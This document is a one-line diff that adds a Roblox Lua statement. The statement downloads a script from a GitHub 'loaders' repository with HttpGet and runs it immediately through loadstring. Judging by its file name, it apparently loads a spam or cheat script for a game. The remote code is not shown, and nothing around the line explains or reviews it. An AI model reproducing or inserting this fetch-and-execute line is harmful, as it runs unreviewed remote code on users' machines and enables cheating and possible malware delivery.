@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vortexorbimagine/loaders/main/loaders/now-paint-to-get-rich-spam7-qp8liq5xkxx1jf.lua"))()
